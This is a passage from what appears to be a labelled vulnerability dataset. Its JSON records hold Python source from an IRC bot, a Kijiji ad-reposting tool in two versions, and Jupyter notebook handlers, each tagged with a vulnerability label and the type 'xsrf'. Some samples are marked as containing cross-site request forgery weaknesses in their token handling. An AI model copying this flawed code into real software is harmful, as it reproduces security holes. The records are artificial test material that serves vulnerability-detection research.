title=html_parser.unescape(title).replace(\"\\r\", \"\").replace(\"\\n\", \" \").strip()\n                                    c.say(CHAN, u\"\u21ea\u6807\u9898: %s\" % title)\n                                else:\n                                    c.say(CHAN, u\"\u21ea\u65e0\u6807\u9898\u7f51\u9875\")\n                            else:\n                                if \"Content-Range\" in h.info():\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s, \u6587\u4ef6\u5927\u5c0f: %s \u5b57\u8282\\r\\n\" % (h.info()[\"Content-Type\"], h.info()[\"Content-Range\"].split(\"/\")[1]))\n                                elif \"Content-Length\" in h.info():\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s, \u6587\u4ef6\u5927\u5c0f: %s \u5b57\u8282\\r\\n\" % (h.info()[\"Content-Type\"], h.info()[\"Content-Length\"]))\n                                else:\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s\\r\\n\" % h.info()[\"Content-Type\"])\n                        else:\n                            c.say(CHAN, u\"\u21eaHTTP %d \u9519\u8bef\\r\\n\" % h.code)\n    except Exception as e:\n        try:\n            c.say(CHAN, u\"\u54ce\u5440\uff0c%s \u597d\u50cf\u51fa\u4e86\u70b9\u95ee\u9898: %s\" % (NICK, e))\n        except:\n            pass\n    except socket.error as e:\n        sys.stderr.write(\"Error: %s\\n\", e)\n        c.quit(\"Network error.\")\n\n# vim: et ft=python sts=4 sw=4 ts=4\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "e64a478b09842d55be64a7cf7badb83ac3eb6493", "code": "kijiji_repost_headless/__main__.py/n/nimport argparse\nimport os\nimport sys\nfrom time import sleep\n\nimport kijiji_api\nimport generate_inf_file as generator\n\nif sys.version_info < (3, 0):\n    raise Exception(\"This program requires Python 3.0 or greater\")\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Post ads on Kijiji\")\n    parser.add_argument('-u', '--username', help='username of your kijiji account')\n    parser.add_argument('-p', '--password', help='password of your kijiji account')\n\n    subparsers = parser.add_subparsers(help='sub-command help')\n\n    post_parser = subparsers.add_parser('post', help='post a new ad')\n    post_parser.add_argument('inf_file', type=str, help='.inf file containing posting details')\n    post_parser.set_defaults(function=post_ad)\n\n    folder_parser = subparsers.add_parser('folder', help='post ad from folder')\n    folder_parser.add_argument('folder_name', type=str, help='folder containing ad details')\n    folder_parser.set_defaults(function=post_folder)\n\n    repost_folder_parser = subparsers.add_parser('repost_folder', help='post ad from folder')\n    repost_folder_parser.add_argument('folder_name', type=str, help='folder containing ad details')\n    repost_folder_parser.set_defaults(function=repost_folder)\n\n    show_parser = subparsers.add_parser('show', help='show currently listed ads')\n    show_parser.set_defaults(function=show_ads)\n\n    delete_parser = subparsers.add_parser('delete', help='delete a listed ad')\n    delete_parser.add_argument('id', type=str, help='id of the ad you wish to delete')\n    delete_parser.set_defaults(function=delete_ad)\n\n    nuke_parser = subparsers.add_parser('nuke', help='delete all ads')\n    nuke_parser.set_defaults(function=nuke)\n\n    check_parser = subparsers.add_parser('check_ad', help='check if ad is active')\n    check_parser.add_argument('folder_name', type=str, help='folder containing ad details')\n    check_parser.set_defaults(function=check_ad)\n\n    repost_parser = subparsers.add_parser('repost', help='repost an existing ad')\n    repost_parser.add_argument('inf_file', type=str, help='.inf file containing posting details')\n    repost_parser.set_defaults(function=repost_ad)\n\n    build_parser = subparsers.add_parser('build_ad', help='Generates the item.inf file for a new ad')\n    build_parser.set_defaults(function=generate_inf_file)\n\n    args = parser.parse_args()\n    try:\n        args.function(args)\n    except AttributeError:\n        parser.print_help()\n\n\ndef get_folder_data(args):\n    \"\"\"\n    Set ad data inf file and extract login credentials from inf files\n    \"\"\"\n    args.inf_file = \"item.inf\"\n    cred_file = args.folder_name + \"/login.inf\"\n    creds = [line.strip() for line in open(cred_file, 'r')]\n    args.username = creds[0]\n    args.password = creds[1]\n\n\ndef get_inf_details(inf_file):\n    \"\"\"\n    Extract ad data from inf file\n    \"\"\"\n    with open(inf_file, 'rt') as infFileLines:\n        data = {key: val for line in infFileLines for (key, val) in (line.strip().split(\"=\"),)}\n    files = [open(picture, 'rb').read() for picture in data['imageCsv'].split(\",\")]\n    return [data, files]\n\n\ndef post_folder(args):\n    \"\"\"\n    Post new ad from folder\n    \"\"\"\n    get_folder_data(args)\n    os.chdir(args.folder_name)\n    post_ad(args)\n\n\ndef post_ad(args):\n    \"\"\"\n    Post new ad\n    \"\"\"\n    [data, image_files] = get_inf_details(args.inf_file)\n    attempts = 1\n    while not check_ad(args) and attempts < 5:\n        if attempts > 1:\n            print(\"Failed Attempt #{}, trying again.\".format(attempts))\n        attempts += 1\n        api = kijiji_api.KijijiApi()\n        api.login(args.username, args.password)\n        api.post_ad_using_data(data, image_files)\n    if not check_ad(args):\n        print(\"Failed Attempt #{}, giving up.\".format(attempts))\n\n\ndef show_ads(args):\n    \"\"\"\n    Print list of all ads\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    [print(\"{} '{}'\".format(ad_id, ad_name)) for ad_name, ad_id in api.get_all_ads()]\n\n\ndef delete_ad(args):\n    \"\"\"\n    Delete ad\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    api.delete_ad(args.id)\n\n\ndef delete_ad_using_title(name):\n    \"\"\"\n    Delete ad based on ad title\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.delete_ad_using_title(name)\n\n\ndef repost_ad(args):\n    \"\"\"\n    Repost ad\n\n    Try to delete ad with same title if possible before reposting new ad\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    del_ad_name = \"\"\n    for line in open(args.inf_file, 'rt'):\n        [key, val] = line.strip().rstrip(\"\\n\").split(\"=\")\n        if key == \"postAdForm.title\":\n            del_ad_name = val\n    try:\n        api.delete_ad_using_title(del_ad_name)\n        print(\"Existing ad deleted before reposting\")\n    except kijiji_api.DeleteAdException:\n        print(\"Did not find an existing ad with matching title, skipping ad deletion\")\n        pass\n    # Must wait a bit before posting the same ad even after deleting it, otherwise Kijiji will automatically remove it\n    sleep(180)\n    post_ad(args)\n\n\ndef repost_folder(args):\n    \"\"\"\n    Repost ad from folder\n    \"\"\"\n    get_folder_data(args)\n    os.chdir(args.folder_name)\n    repost_ad(args)\n\n\ndef check_ad(args):\n    \"\"\"\n    Check if ad is live\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    ad_name = \"\"\n    for line in open(args.inf_file, 'rt'):\n        [key, val] = line.strip().rstrip(\"\\n\").split(\"=\")\n        if key == \"postAdForm.title\":\n            ad_name = val\n    all_ads = api.get_all_ads()\n    return [t for t, i in all_ads if t == ad_name]\n\n\ndef nuke(args):\n    \"\"\"\n    Delete all ads\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    all_ads = api.get_all_ads()\n    [api.delete_ad(ad_id) for ad_name, ad_id in all_ads]\n\n\ndef generate_inf_file():\n    generator.run_program()\n\n\nif __name__ == \"__main__\":\n    main()\n/n/n/nkijiji_repost_headless/kijiji_api.py/n/nimport json\nimport re\nimport sys\nfrom time import strftime\n\nimport bs4\nimport requests\nimport yaml\n\nif sys.version_info < (3, 0):\n    raise Exception(\"This program requires Python 3.0 or greater\")\n\n\nclass KijijiApiException(Exception):\n    \"\"\"\n    Custom KijijiApi exception class\n    \"\"\"\n    def __init__(self, msg=\"KijijiApi exception encountered.\", dump=None):\n        self.msg = msg\n        self.dumpfilepath = \"\"\n        if dump:\n            self.dumpfilepath = \"kijijiapi_dump_{}.txt\".format(strftime(\"%Y%m%dT%H%M%S\"))\n            with open(self.dumpfilepath, 'a') as f:\n                f.write(dump)\n\n    def __str__(self):\n        if self.dumpfilepath:\n            return \"{}\\nSee {} in current directory for latest dumpfile.\".format(self.msg, self.dumpfilepath)\n        else:\n            return self.msg\n\n\ndef get_token(html, attrib_name):\n    \"\"\"\n    Return value of first match for element with name attribute\n    \"\"\"\n    soup = bs4.BeautifulSoup(html, 'html.parser')\n    res = soup.select(\"[name={}]\".format(attrib_name))\n    if not res:\n        raise KijijiApiException(\"Element with name attribute '{}' not found in html text.\".format(attrib_name), html)\n    return res[0]['value']\n\n\ndef get_kj_data(html):\n    \"\"\"\n    Return dict of Kijiji page data\n    The 'window.__data' JSON object contains many useful key/values\n    \"\"\"\n    soup = bs4.BeautifulSoup(html, 'html.parser')\n    p = re.compile('window.__data=(.*);')\n    script_list = soup.find_all(\"script\", {\"src\": False})\n    for script in script_list:\n        if script:\n            m = p.search(script.string)\n            if m:\n                return json.loads(m.group(1))\n    raise KijijiApiException(\"'__data' JSON object not found in html text.\", html)\n\n\ndef get_xsrf_token(html):\n    \"\"\"\n    Return XSRF token\n    This function is only necessary for the 'm-my-ads.html' page, as this particular page\n    does not contain the usual 'ca.kijiji.xsrf.token' hidden HTML form input element, which is easier to scrape\n    \"\"\"\n    soup = bs4.BeautifulSoup(html, 'html.parser')\n    p = re.compile('Zoop\\.init\\(.*config: ({.+?}).*\\);')\n    for script in soup.find_all(\"script\", {\"src\": False}):\n        if script:\n            m = p.search(script.string.replace(\"\\n\", \"\"))\n            if m:\n                # Using yaml to load since this is not valid JSON\n                return yaml.load(m.group(1))['token']\n    raise KijijiApiException(\"XSRF token not found in html text.\", html)\n\n\nclass KijijiApi:\n    \"\"\"\n    All functions require to be logged in to Kijiji first in order to function correctly\n    \"\"\"\n    def __init__(self):\n        config = {}\n        self.session = requests.Session()\n\n    def login(self, username, password):\n        \"\"\"\n        Login to Kijiji for the current session\n        \"\"\"\n        login_url = 'https://www.kijiji.ca/t-login.html'\n        resp = self.session.get(login_url)\n        payload = {\n            'emailOrNickname': username,\n            'password': password,\n            'rememberMe': 'true',\n            '_rememberMe': 'on',\n            'ca.kijiji.xsrf.token': get_token(resp.text, 'ca.kijiji.xsrf.token'),\n            'targetUrl': get_kj_data(resp.text)['config']['targetUrl'],\n        }\n        resp = self.session.post(login_url, data=payload)\n        if not self.is_logged_in():\n            raise KijijiApiException(\"Could not log in.\", resp.text)\n\n    def is_logged_in(self):\n        \"\"\"\n        Return true if logged into Kijiji for the current session\n        \"\"\"\n        return \"Sign Out\" in self.session.get('https://www.kijiji.ca/m-my-ads.html/').text\n\n    def logout(self):\n        \"\"\"\n        Logout of Kijiji for the current session\n        \"\"\"\n        self.session.get('https://www.kijiji.ca/m-logout.html')\n\n    def delete_ad(self, ad_id):\n        \"\"\"\n        Delete ad based on ad ID\n        \"\"\"\n        my_ads_page = self.session.get('https://www.kijiji.ca/m-my-ads.html')\n        params = {\n            'Action': 'DELETE_ADS',\n            'Mode': 'ACTIVE',\n            'needsRedirect': 'false',\n            'ads': '[{{\"adId\":\"{}\",\"reason\":\"PREFER_NOT_TO_SAY\",\"otherReason\":\"\"}}]'.format(ad_id),\n            'ca.kijiji.xsrf.token': get_xsrf_token(my_ads_page.text),\n        }\n        resp = self.session.post('https://www.kijiji.ca/j-delete-ad.json', data=params)\n        if \"OK\" not in resp.text:\n            raise KijijiApiException(\"Could not delete ad.\", resp.text)\n\n    def delete_ad_using_title(self, title):\n        \"\"\"\n        Delete ad based on ad title\n        \"\"\"\n        all_ads = self.get_all_ads()\n        [self.delete_ad(i) for t, i in all_ads if t.strip() == title.strip()]\n\n    def upload_image(self, token, image_files=[]):\n        \"\"\"\n        Upload one or more photos to Kijiji\n\n        'image_files' is a list of binary objects corresponding to images\n        \"\"\"\n        image_urls = []\n        image_upload_url = 'https://www.kijiji.ca/p-upload-image.html'\n        for img_file in image_files:\n            for i in range(0, 3):\n                r = self.session.post(image_upload_url, files={'file': img_file}, headers={\"X-Ebay-Box-Token\": token})\n                r.raise_for_status()\n                try:\n                    image_tree = json.loads(r.text)\n                    img_url = image_tree['thumbnailUrl']\n                    print(\"Image Upload success on try #{}\".format(i+1))\n                    image_urls.append(img_url)\n                    break\n                except (KeyError, ValueError):\n                    print(\"Image Upload failed on try #{}\".format(i+1))\n        return [image for image in image_urls if image is not None]\n\n    def post_ad_using_data(self, data, image_files=[]):\n        \"\"\"\n        Post new ad\n\n        'data' is a dictionary of ad data that to be posted\n        'image_files' is a list of binary objects corresponding to images to upload\n        \"\"\"\n        # Load ad posting page (arbitrary category)\n        resp = self.session.get('https://www.kijiji.ca/p-admarkt-post-ad.html?categoryId=15')\n\n        # Get token required for upload\n        m = re.search(r\"initialXsrfToken: '(\\S+)'\", resp.text)\n        if m:\n            image_upload_token = m.group(1)\n        else:\n            raise KijijiApiException(\"'initialXsrfToken' not found in html text.\", resp.text)\n\n        # Upload the images\n        image_list = self.upload_image(image_upload_token, image_files)\n        data['images'] = \",\".join(image_list)\n\n        # Retrieve XSRF tokens\n        data['ca.kijiji.xsrf.token'] = get_token(resp.text, 'ca.kijiji.xsrf.token')\n        data['postAdForm.fraudToken'] = get_token(resp.text, 'postAdForm.fraudToken')\n\n        # Format ad data and check constraints\n        data['postAdForm.description'] = data['postAdForm.description'].replace(\"\\\\n\", \"\\n\")\n        title_len = len(data.get(\"postAdForm.title\", \"\"))\n        if not title_len >= 10:\n            raise KijijiApiException(\"Your ad title is too short! (min 10 chars)\")\n        if title_len > 64:\n            raise KijijiApiException(\"Your ad title is too long! (max 64 chars)\")\n\n        # Upload the ad itself\n        new_ad_url = \"https://www.kijiji.ca/p-submit-ad.html\"\n        resp = self.session.post(new_ad_url, data=data)\n        resp.raise_for_status()\n        if \"Delete Ad?\" not in resp.text:\n            if \"There was an issue posting your ad, please contact Customer Service.\" in resp.text:\n                raise KijijiApiException(\"Could not post ad; this user is banned.\", resp.text)\n            else:\n                raise KijijiApiException(\"Could not post ad.\", resp.text)\n\n        # Extract ad ID from response set-cookie\n        ad_id = re.search('kjrva=(\\d+)', resp.headers['Set-Cookie']).group(1)\n\n        return ad_id\n\n    def get_all_ads(self):\n        \"\"\"\n        Return an iterator of tuples containing the ad title and ad ID for every ad\n        \"\"\"\n        resp = self.session.get('https://www.kijiji.ca/m-my-ads.html')\n        user_id = get_kj_data(resp.text)['config']['userId']\n        my_ads_url = 'https://www.kijiji.ca/j-get-my-ads.json?currentOffset=0&show=ACTIVE&user={}'.format(user_id)\n        my_ads_page = self.session.get(my_ads_url)\n        my_ads_tree = json.loads(my_ads_page.text)\n        ad_ids = [entry['id'] for entry in my_ads_tree['myAdEntries']]\n        ad_names = [entry['title'] for entry in my_ads_tree['myAdEntries']]\n        return zip(ad_names, ad_ids)\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "e64a478b09842d55be64a7cf7badb83ac3eb6493", "code": "/kijiji_repost_headless/__main__.py/n/nimport argparse\nimport os\nimport sys\nfrom time import sleep\n\nimport kijiji_api\nimport generate_inf_file as generator\n\nif sys.version_info < (3, 0):\n    raise Exception(\"This program requires Python 3.0 or greater\")\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Post ads on Kijiji\")\n    parser.add_argument('-u', '--username', help='username of your kijiji account')\n    parser.add_argument('-p', '--password', help='password of your kijiji account')\n\n    subparsers = parser.add_subparsers(help='sub-command help')\n\n    postParser = subparsers.add_parser('post', help='post a new ad')\n    postParser.add_argument('inf_file', type=str, help='.inf file containing posting details')\n    postParser.set_defaults(function=post_ad)\n\n    folderParser = subparsers.add_parser('folder', help='post ad from folder')\n    folderParser.add_argument('folderName', type=str, help='folder containing ad details')\n    folderParser.set_defaults(function=post_folder)\n\n    repostFolderParser = subparsers.add_parser('repost_folder', help='post ad from folder')\n    repostFolderParser.add_argument('folderName', type=str, help='folder containing ad details')\n    repostFolderParser.set_defaults(function=repost_folder)\n\n    showParser = subparsers.add_parser('show', help='show currently listed ads')\n    showParser.set_defaults(function=show_ads)\n\n    deleteParser = subparsers.add_parser('delete', help='delete a listed ad')\n    deleteParser.add_argument('id', type=str, help='id of the ad you wish to delete')\n    deleteParser.set_defaults(function=delete_ad)\n\n    nukeParser = subparsers.add_parser('nuke', help='delete all ads')\n    nukeParser.set_defaults(function=nuke)\n\n    checkParser = subparsers.add_parser('check_ad', help='check if ad is active')\n    checkParser.add_argument('folderName', type=str, help='folder containing ad details')\n    checkParser.set_defaults(function=check_ad)\n\n    repostParser = subparsers.add_parser('repost', help='repost an existing ad')\n    repostParser.add_argument('inf_file', type=str, help='.inf file containing posting details')\n    repostParser.set_defaults(function=repost_ad)\n\n    buildParser = subparsers.add_parser('build_ad', help='Generates the item.inf file for a new ad')\n    buildParser.set_defaults(function=generate_inf_file)\n\n    args = parser.parse_args()\n    try:\n        args.function(args)\n    except AttributeError:\n        parser.print_help()\n\n\ndef get_folder_data(args):\n    \"\"\"\n    Set ad data inf file and extract login credentials from inf files\n    \"\"\"\n    args.inf_file = \"item.inf\"\n    cred_file = args.folderName + \"/login.inf\"\n    creds = [line.strip() for line in open(cred_file, 'r')]\n    args.username = creds[0]\n    args.password = creds[1]\n\n\ndef get_inf_details(inf_file):\n    \"\"\"\n    Extract ad data from inf file\n    \"\"\"\n    with open(inf_file, 'rt') as infFileLines:\n        data = {key: val for line in infFileLines for (key, val) in (line.strip().split(\"=\"),)}\n    files = [open(picture, 'rb').read() for picture in data['imageCsv'].split(\",\")]\n    return [data, files]\n\n\ndef post_folder(args):\n    \"\"\"\n    Post new ad from folder\n    \"\"\"\n    get_folder_data(args)\n    os.chdir(args.folderName)\n    post_ad(args)\n\n\ndef post_ad(args):\n    \"\"\"\n    Post new ad\n    \"\"\"\n    [data, imageFiles] = get_inf_details(args.inf_file)\n    attempts = 1\n    while not check_ad(args) and attempts < 5:\n        if attempts > 1:\n            print(\"Failed Attempt #\" + str(attempts) + \", trying again.\")\n        attempts += 1\n        api = kijiji_api.KijijiApi()\n        api.login(args.username, args.password)\n        api.post_ad_using_data(data, imageFiles)\n        sleep(180)\n    if not check_ad(args):\n        print(\"Failed Attempt #\" + str(attempts) + \", giving up.\")\n\n\ndef show_ads(args):\n    \"\"\"\n    Print list of all ads\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    [print(\"{} '{}'\".format(adId, adName)) for adName, adId in api.get_all_ads()]\n\n\ndef delete_ad(args):\n    \"\"\"\n    Delete ad\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    api.delete_ad(args.id)\n\n\ndef delete_ad_using_title(name):\n    \"\"\"\n    Delete ad based on ad title\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.delete_ad_using_title(name)\n\n\ndef repost_ad(args):\n    \"\"\"\n    Repost ad\n\n    Try to delete ad with same title if possible before reposting new ad\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    delAdName = \"\"\n    for line in open(args.inf_file, 'rt'):\n        [key, val] = line.strip().rstrip(\"\\n\").split(\"=\")\n        if key == \"postAdForm.title\":\n            delAdName = val\n    try:\n        api.delete_ad_using_title(delAdName)\n        print(\"Existing ad deleted before reposting\")\n    except kijiji_api.DeleteAdException:\n        print(\"Did not find an existing ad with matching title, skipping ad deletion\")\n        pass\n    # Must wait a bit before posting the same ad even after deleting it, otherwise Kijiji will automatically remove it\n    sleep(180)\n    post_ad(args)\n\n\ndef repost_folder(args):\n    \"\"\"\n    Repost ad from folder\n    \"\"\"\n    get_folder_data(args)\n    os.chdir(args.folderName)\n    repost_ad(args)\n\n\ndef check_ad(args):\n    \"\"\"\n    Check if ad is live\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    AdName = \"\"\n    for line in open(args.inf_file, 'rt'):\n        [key, val] = line.strip().rstrip(\"\\n\").split(\"=\")\n        if key == \"postAdForm.title\":\n            AdName = val\n    allAds = api.get_all_ads()\n    return [t for t, i in allAds if t == AdName]\n\n\ndef nuke(args):\n    \"\"\"\n    Delete all ads\n    \"\"\"\n    api = kijiji_api.KijijiApi()\n    api.login(args.username, args.password)\n    allAds = api.get_all_ads()\n    [api.delete_ad(adId) for adName, adId in allAds]\n\ndef generate_inf_file(args):\n    generator.run_program()\n\nif __name__ == \"__main__\":\n    main()\n/n/n/n/kijiji_repost_headless/kijiji_api.py/n/nimport requests\nimport json\nimport bs4\nimport re\nimport sys\nfrom multiprocessing import Pool\nfrom time import strftime\n\nif sys.version_info < (3, 0):\n    raise Exception(\"This program requires Python 3.0 or greater\")\n\n\nclass KijijiApiException(Exception):\n    \"\"\"\n    Custom KijijiApi exception class\n    \"\"\"\n    def __init__(self, dump=None):\n        self.dumpfilepath = \"\"\n        if dump:\n            self.dumpfilepath = \"kijiji_dump_{}.txt\".format(strftime(\"%Y%m%dT%H%M%S\"))\n            with open(self.dumpfilepath, 'a') as f:\n                f.write(dump)\n    def __str__(self):\n        if self.dumpfilepath:\n            return \"See {} in current directory for latest dumpfile.\".format(self.dumpfilepath)\n        else:\n            return \"\"\n\nclass SignInException(KijijiApiException):\n    def __str__(self):\n        return \"Could not sign in.\\n\"+super().__str__()\n\nclass PostAdException(KijijiApiException):\n    def __str__(self):\n        return \"Could not post ad.\\n\"+super().__str__()\n\nclass BannedException(KijijiApiException):\n    def __str__(self):\n        return \"Could not post ad, this user is banned.\\n\"+super().__str__()\n\nclass DeleteAdException(KijijiApiException):\n    def __str__(self):\n        return \"Could not delete ad.\\n\"+super().__str__()\n\n\ndef get_token(html, token_name):\n    \"\"\"\n    Retrive CSRF token from webpage\n    Tokens are different every time a page is visitied\n    \"\"\"\n    soup = bs4.BeautifulSoup(html, 'html.parser')\n    res = soup.select(\"[name={}]\".format(token_name))\n    if not res:\n        print(\"Token '{}' not found in html text.\".format(token_name))\n        return \"\"\n    return res[0]['value']\n\n\nclass KijijiApi:\n    \"\"\"\n    All functions require to be logged in to Kijiji first in order to function correctly\n    \"\"\"\n    def __init__(self):\n        config = {}\n        self.session = requests.Session()\n\n    def login(self, username, password):\n        \"\"\"\n        Login to Kijiji for the current session\n        \"\"\"\n        login_url = 'https://www.kijiji.ca/t-login.html'\n        resp = self.session.get(login_url)\n        payload = {\n            'emailOrNickname': username,\n            'password': password,\n            'rememberMe': 'true',\n            '_rememberMe': 'on',\n            'ca.kijiji.xsrf.token': get_token(resp.text, 'ca.kijiji.xsrf.token'),\n            'targetUrl': 'L3QtbG9naW4uaHRtbD90YXJnZXRVcmw9TDNRdGJHOW5hVzR1YUhSdGJEOTBZWEpuWlhSVmNtdzlUREpuZEZwWFVuUmlNalV3WWpJMGRGbFlTbXhaVXpoNFRucEJkMDFxUVhsWWJVMTZZbFZLU1dGVmJHdGtiVTVzVlcxa1VWSkZPV0ZVUmtWNlUyMWpPVkJSTFMxZVRITTBVMk5wVW5wbVRHRlFRVUZwTDNKSGNtVk9kejA5XnpvMnFzNmc2NWZlOWF1T1BKMmRybEE9PQ--'\n            }\n        resp = self.session.post(login_url, data=payload)\n        if not self.is_logged_in():\n            raise SignInException(resp.text)\n\n    def is_logged_in(self):\n        \"\"\"\n        Return true if logged into Kijiji for the current session\n        \"\"\"\n        index_page_text = self.session.get('https://www.kijiji.ca/m-my-ads.html/').text\n        return \"Sign Out\" in index_page_text\n\n    def logout(self):\n        \"\"\"\n        Logout of Kijiji for the current session\n        \"\"\"\n        self.session.get('https://www.kijiji.ca/m-logout.html')\n\n    def delete_ad(self, ad_id):\n        \"\"\"\n        Delete ad based on ad ID\n        \"\"\"\n        my_ads_page = self.session.get('https://www.kijiji.ca/m-my-ads.html')\n        params = {\n            'Action': 'DELETE_ADS',\n            'Mode': 'ACTIVE',\n            'needsRedirect': 'false',\n            'ads': '[{{\"adId\":\"{}\",\"reason\":\"PREFER_NOT_TO_SAY\",\"otherReason\":\"\"}}]'.format(ad_id),\n            'ca.kijiji.xsrf.token': get_token(my_ads_page.text, 'ca.kijiji.xsrf.token')\n            }\n        resp = self.session.post('https://www.kijiji.ca/j-delete-ad.json', data=params)\n        if (\"OK\" not in resp.text):\n            raise DeleteAdException(resp.text)\n\n    def delete_ad_using_title(self, title):\n        \"\"\"\n        Delete ad based on ad title\n        \"\"\"\n        allAds = self.get_all_ads()\n        [self.delete_ad(i) for t, i in allAds if t.strip() == title.strip()]\n\n    def upload_image(self, token, image_files=[]):\n        \"\"\"\n        Upload one or more photos to Kijiji concurrently using Pool\n\n        'image_files' is a list of binary objects corresponding to images\n        \"\"\"\n        image_urls = []\n        image_upload_url = 'https://www.kijiji.ca/p-upload-image.html'\n        for img_file in image_files:\n            for i in range(0, 3):\n                files = {'file': img_file}\n                r = self.session.post(image_upload_url, files=files, headers={\"x-ebay-box-token\": token})\n                if (r.status_code != 200):\n                    print(r.status_code)\n                try:\n                    image_tree = json.loads(r.text)\n                    img_url = image_tree['thumbnailUrl']\n                    print(\"Image Upload success on try #{}\".format(i+1))\n                    image_urls.append(img_url)\n                    break\n                except (KeyError, ValueError) as e:\n                    print(\"Image Upload failed on try #{}\".format(i+1))\n        return [image for image in image_urls if image is not None]\n\n    def post_ad_using_data(self, data, image_files=[]):\n        \"\"\"\n        Post new ad\n\n        'data' is a dictionary of ad data that to be posted\n        'image_files' is a list of binary objects corresponding to images to upload\n        \"\"\"\n        # Load ad posting page\n        resp = self.session.get('https://www.kijiji.ca/p-admarkt-post-ad.html?categoryId=773')\n\n        #Get tokens required for upload\n        token_regex = r\"initialXsrfToken: '\\S+'\"\n        image_upload_token = re.findall(token_regex, resp.text)[0].strip(\"initialXsrfToken: '\").strip(\"'\")\n\n        # Upload the images\n        imageList = self.upload_image(image_upload_token, image_files)\n        data['images'] = \",\".join(imageList)\n\n        # Retrive tokens for website\n        data['ca.kijiji.xsrf.token'] = get_token(resp.text, 'ca.kijiji.xsrf.token')\n        data['postAdForm.fraudToken'] = get_token(resp.text, 'postAdForm.fraudToken')\n        data['postAdForm.description'] = data['postAdForm.description'].replace(\"\\\\n\", \"\\n\")\n\n        # Upload the ad itself\n        new_ad_url = \"https://www.kijiji.ca/p-submit-ad.html\"\n        resp = self.session.post(new_ad_url, data=data)\n        if not len(data.get(\"postAdForm.title\", \"\")) >= 10:\n            raise AssertionError(\"Your title is too short!\")\n        if (int(resp.status_code) != 200 or \\\n                \"Delete Ad?\" not in resp.text):\n            if \"There was an issue posting your ad, please contact Customer Service.\" in resp.text:\n                raise BannedException(resp.text)\n            else:\n                raise PostAdException(resp.text)\n\n        # Get adId and return it\n        new_cookie_with_ad_id = resp.headers['Set-Cookie']\n        ad_id = re.search('\\d+', new_cookie_with_ad_id).group()\n        return ad_id\n\n    def get_all_ads(self):\n        \"\"\"\n        Return an iterator of tuples containing the ad title and ad ID for every ad\n        \"\"\"\n        resp = self.session.get('https://www.kijiji.ca/m-my-ads.html')\n        user_id=get_token(resp.text, 'userId')\n        my_ads_url = 'https://www.kijiji.ca/j-get-my-ads.json?_=1&currentOffset=0&isPromoting=false&show=ACTIVE&user={}'.format(user_id)\n        my_ads_page = self.session.get(my_ads_url)\n        my_ads_tree = json.loads(my_ads_page.text)\n        ad_ids = [entry['id'] for entry in my_ads_tree['myAdEntries']]\n        ad_names = [entry['title'] for entry in my_ads_tree['myAdEntries']]\n        return zip(ad_names, ad_ids)\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "d6f091c4439c174c7700776c0cee03053403f600", "code": "notebook/base/handlers.py/n/n\"\"\"Base Tornado handlers for the notebook server.\"\"\"\n\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nimport functools\nimport json\nimport os\nimport re\nimport sys\nimport traceback\ntry:\n    # py3\n    from http.client import responses\nexcept ImportError:\n    from httplib import responses\ntry:\n    from urllib.parse import urlparse # Py 3\nexcept ImportError:\n    from urlparse import urlparse # Py 2\n\nfrom jinja2 import TemplateNotFound\nfrom tornado import web, gen, escape\nfrom tornado.log import app_log\n\nfrom notebook._sysinfo import get_sys_info\n\nfrom traitlets.config import Application\nfrom ipython_genutils.path import filefind\nfrom ipython_genutils.py3compat import string_types\n\nimport notebook\nfrom notebook.utils import is_hidden, url_path_join, url_is_absolute, url_escape\nfrom notebook.services.security import csp_report_uri\n\n#-----------------------------------------------------------------------------\n# Top-level handlers\n#-----------------------------------------------------------------------------\nnon_alphanum = re.compile(r'[^A-Za-z0-9]')\n\nsys_info = json.dumps(get_sys_info())\n\ndef log():\n    if Application.initialized():\n        return Application.instance().log\n    else:\n        return app_log\n\nclass AuthenticatedHandler(web.RequestHandler):\n    \"\"\"A RequestHandler with an authenticated user.\"\"\"\n\n    @property\n    def content_security_policy(self):\n        \"\"\"The default Content-Security-Policy header\n        \n        Can be overridden by defining Content-Security-Policy in settings['headers']\n        \"\"\"\n        return '; '.join([\n            \"frame-ancestors 'self'\",\n            # Make sure the report-uri is relative to the base_url\n            \"report-uri \" + url_path_join(self.base_url, csp_report_uri),\n        ])\n\n    def set_default_headers(self):\n        headers = self.settings.get('headers', {})\n\n        if \"Content-Security-Policy\" not in headers:\n            headers[\"Content-Security-Policy\"] = self.content_security_policy\n\n        # Allow for overriding headers\n        for header_name,value in headers.items() :\n            try:\n                self.set_header(header_name, value)\n            except Exception as e:\n                # tornado raise Exception (not a subclass)\n                # if method is unsupported (websocket and Access-Control-Allow-Origin\n                # for example, so just ignore)\n                self.log.debug(e)\n    \n    def clear_login_cookie(self):\n        self.clear_cookie(self.cookie_name)\n    \n    def get_current_user(self):\n        if self.login_handler is None:\n            return 'anonymous'\n        return self.login_handler.get_user(self)\n\n    def skip_check_origin(self):\n        \"\"\"Ask my login_handler if I should skip the origin_check\n        \n        For example: in the default LoginHandler, if a request is token-authenticated,\n        origin checking should be skipped.\n        \"\"\"\n        if self.login_handler is None or not hasattr(self.login_handler, 'should_check_origin'):\n            return False\n        return not self.login_handler.should_check_origin(self)\n\n    @property\n    def token_authenticated(self):\n        \"\"\"Have I been authenticated with 